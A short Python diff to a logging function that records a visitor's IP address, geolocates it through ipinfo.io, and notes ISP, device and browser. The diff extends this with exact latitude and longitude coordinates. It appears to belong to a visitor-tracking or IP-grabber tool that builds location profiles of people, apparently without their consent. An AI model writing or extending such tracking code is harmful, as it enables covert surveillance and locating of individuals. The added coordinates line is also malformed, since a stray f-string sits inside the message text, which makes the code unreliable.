@@ -26,6 +26,8 @@ def log():
     ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
     loc = ip_info.get("city", "") + ", " + ip_info.get("region", "") + " (" + ip_info.get("country", "") + ")"
     isp = ip_info.get("org", "")
+    latitude = data.get('latitude', 'N/A')
+    longitude = data.get('longitude', 'N/A')
     
     # Get Time
     time = datetime.datetime.now().strftime("%d-%b-%Y %I:%M %p")
@@ -36,6 +38,7 @@ def log():
 🌐 IP: {ip}
 🌎 Location: {loc}
 📡 ISP: {isp}
+f"📍 Coordinates: {latitude}, {longitude}"
 
 📱 Device: {data.get('device')}
 🧠 Browser: {data.get('browser')}
